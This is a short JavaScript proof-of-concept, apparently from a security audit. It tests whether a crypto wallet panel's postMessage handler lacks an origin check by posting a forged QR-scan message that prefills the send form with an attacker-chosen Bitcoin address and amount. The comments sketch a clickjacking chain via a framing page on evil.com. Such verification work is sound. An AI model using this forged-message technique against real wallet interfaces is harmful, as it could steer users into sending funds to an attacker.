// P0.5 panel #3 blocker (DRIVE leg) — WalletPanel.tsx message handler has no
// event.origin check. A forged qr_scan_result should prefill the send form and
// open it, with an ATTACKER-chosen recipient/amount, with no user QR scan.
//
// Run INSIDE the wallet-panel overlay (same context) to observe the React state
// change the forged message causes — this is exactly the effect a cross-origin
// framing parent achieves via iframe.contentWindow.postMessage(...). The SERVE +
// TRUST legs (that evil.com can frame + the frame is trusted) need a
// production-layout build and are verified by code reading; this measures the
// DRIVE leg the "one clickjacked click" claim turns on.
(function () {
  var attacker = '1BitcoinEaterAddressDontSendf59kuE';
  var before = {
    sendFormVisible: !!document.querySelector('[data-testid="send-form"], form'),
    bodyHasAttacker: document.body.innerText.indexOf(attacker) !== -1
  };
  window.postMessage({
    type: 'qr_scan_result',
    data: [{ type: 'bip21', value: 'bitcoin:' + attacker + '?amount=0.5' }]
  }, '*');
  return new Promise(function (resolve) {
    setTimeout(function () {
      resolve(JSON.stringify({
        href: location.href,
        before: before,
        after: {
          bodyHasAttacker: document.body.innerText.indexOf(attacker) !== -1,
          recipientInputs: Array.prototype.slice
            .call(document.querySelectorAll('input'))
            .map(function (i) { return i.value; })
            .filter(function (v) { return v && v.indexOf(attacker) !== -1; })
        }
      }));
    }, 700);
  });
})()
